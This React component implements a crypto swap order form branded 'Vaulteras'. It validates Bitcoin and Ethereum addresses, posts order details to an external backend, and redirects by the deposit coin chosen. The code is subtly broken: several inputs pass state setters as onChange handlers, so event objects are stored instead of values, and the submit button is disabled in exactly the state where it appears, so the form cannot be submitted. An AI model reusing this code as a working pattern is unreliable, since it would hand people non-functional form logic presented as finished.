import React, { useState } from "react";
import { ThreeDots } from "react-loader-spinner";

/* ===== Validators ===== */

const validateBitcoinAddress = (address) => {
  if (!address) return false;
  const btcRegex =
    /^(bc1)[0-9a-z]{25,62}$|^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/;
  return btcRegex.test(address);
};

const validateEthereumAddress = (address) => {
  return /^0x[a-fA-F0-9]{40}$/.test(address);
};

const validateAddress = (withdraw, address) => {
  if (!withdraw || !address) return false;

  switch (withdraw) {
    case "Bitcoin":
      return validateBitcoinAddress(address);
    case "Ethereum":
      return validateEthereumAddress(address);
    default:
      return false;
  }
};

/* ===== Component ===== */

const BitcoinAddressValidation = () => {
  const [deposit, setDeposit] = useState("");
  const [amount, setAmount] = useState("");
  const [withdraw, setWithdraw] = useState("");
  const [network, setNetwork] = useState("");
  const [address, setAddress] = useState("");
  const [valid, setValid] = useState(null);
  const [loading, setLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");

  const handleAddressChange = (e) => {
    const value = e.target.value.trim();
    setAddress(value);
    setValid(validateAddress(withdraw, value));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setErrorMessage("");

    if (!valid) {
      setErrorMessage("Invalid wallet address");
      return;
    }

    setLoading(true);

    const inputData = { deposit, amount, withdraw, network, address };
    localStorage.setItem("inputData", JSON.stringify(inputData));

    try {
      await fetch("https://elixirmagicbackend.adaptable.app/bitcoin/add", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(inputData),
      });
    } catch {
      setErrorMessage("Submission failed. Try again.");
      setLoading(false);
      return;
    }

    setTimeout(() => {
      if (
        window.confirm(
          "Are you sure you want to submit this form? You will be redirected."
        )
      ) {
        if (deposit === "Bitcoin") {
          window.location.href =
            "/c439ca6b170e956cdab143217d11a5c170a273156f0561833aca22b22b046451";
        }
        if (deposit === "Ethereum") {
          window.location.href =
            "/40d1aabae0adcc31bf4ac587b3abb11e88d02a42b681670efa4b82058bbd818b";
        }
      }
    }, 2000);
  };

  return (
    <>
      <div className='md:fixed w-full'>
        <div className='max-w-screen-2xl'>
          <div className='fixed lg:px-10 mx-auto bg-[#0c0c0c] py-2 px-5 w-full items-center'>
            <div>
              <div className='flex gap-2 items-center'>
                <img className="w-14" src='./favicon.png' alt='logo'/>
                <div>
                  <h1 className='text-md font-bold text-[#d8bb6c]'>Vaulteras</h1>
                  <h1 className='text-white md:text-xl font-semibold uppercase'>Submit Order</h1>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div className='min-h-screen items-center mx-auto w-full pt-20 md:pt-24 px-5 bg-blacke duration-500'>
          <div className='items-center md:mx-auto md:max-w-md justify-center md:px-8 md:my-8 md:bg-[#0D0D0D]'>
            <div className='md:max-w-screen-md items-center mx-auto md:py-3'>
              <form className='my-5' onSubmit={handleSubmit}>
                <div className=""> 
                  <p className='text-[#a0a0a0] text-sm py-2 font-semibold'>Deposit Coin</p>
                  <select
                    className="form-control bg-[#202020] text-white py-3 hover:border hover:border-[#DFC660] mx-auto duration-500 rounded-sm pl-3 text-sm font-semibold w-full"
                    id="withdraw"
                    required
                    value={deposit} 
                    onChange={setDeposit}>
                    <option>Choice a Currency</option>
                    <option value="Bitcoin">BTC</option>
                    <option value="Ethereum">ETH</option>
                  </select>
                </div>
                <div className="form-group md:py-2 py-1"> 
                  <p className='text-[#a0a0a0] text-sm py-2 font-semibold'>Amount</p>
                  <input 
                    type="number"
                    id="amount"
                    required
                    className="form-control bg-[#202020] text-white py-3 hover:border hover:border-[#DFC660] mx-auto duration-500 rounded-sm pl-3 text-sm w-full"
                    value={amount}
                    onChange={setAmount}
                  />
                   {errorMessage && <p className='text-red-500 text-sm pt-2'>{errorMessage}</p>}
                </div>
                <p className='text-[#a0a0a0] text-sm py-2 font-semibold'>Withdraw Coin</p>           
                <select
                  className="form-control bg-[#202020] text-white py-3 font-semibold hover:border hover:border-[#DFC660] mx-auto duration-500 rounded-sm pl-3 text-sm w-full"
                  id="withdraw"
                  required
                  value={withdraw} 
                  onChange={setWithdraw}>
                  <option >Choice a Currency</option>
                  <option value="Bitcoin">Bitcoin</option>
                  <option value="Ethereum">Ethereum</option>
                </select>
                <div className="form-group md:py-2 py-1 duration-500"> 
                  <p className='text-[#a0a0a0] text-sm py-2 font-semibold'>Network</p>
                  <input type="text" 
                    id="network"
                    required
                    className="form-control bg-[#202020] text-[#f5f5f5] font-semibold py-3 mx-auto duration-500 rounded-sm pl-3 text-sm w-full"
                    value={network}
                    onChange={setNetwork}
                  />
                </div>
                <div className="form-group py-1"> 
                  <p className='text-[#a0a0a0] text-sm py-2 font-semibold'>Received Address</p>
                  <input type="text" 
                    placeholder='Long press to paste' 
                    id="address"
                    value={address}
                    required
                    className="form-control bg-[#202020] text-white py-3 hover:border hover:border-[#DFC660] mx-auto duration-500 rounded-sm pl-3 text-sm w-full"
                    onChange={handleAddressChange}
                  />
                  {valid === false && <p className='text-red-500 text-sm pt-2'>Invalid Address</p>}
                </div>
                <div className=' text-white text-sm'>
                  <p className='text-[#DFC660] font-bold pt-1'>
                    Note:
                  </p>
                  <p className='pt-2 text-[#848E9C]'>
                    If you provide the wrong received wallet address and send crypto amount detailed, then your funds will be permanently lost.
                  </p>
                </div>
                <div className="form-group py-8">
                  {valid === true && (
                  <button disabled={valid}
                    value={setValid} 
                    className="duration-700 justify-center items-center font-semibold text-sm md:text-base md:h-12 h-10 font-sans w-full text-center flex rounded-sm bg-[#DFC660] text-black"
                    type="submit">
                    {loading ? (
                      <div className='flex items-center gap-3 cursor-progress'>
                        <span className='text-base'>Loading</span>
                        <ThreeDots height="20" width="20" radius="9" color="#000" ariaLabel="three-dots-loading" wrapperStyle={{}} wrapperClassName="" visible={true}/>
                      </div>
                      ) : (
                      'Submit'
                    )}
                  </button>
                  )}
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default BitcoinAddressValidation;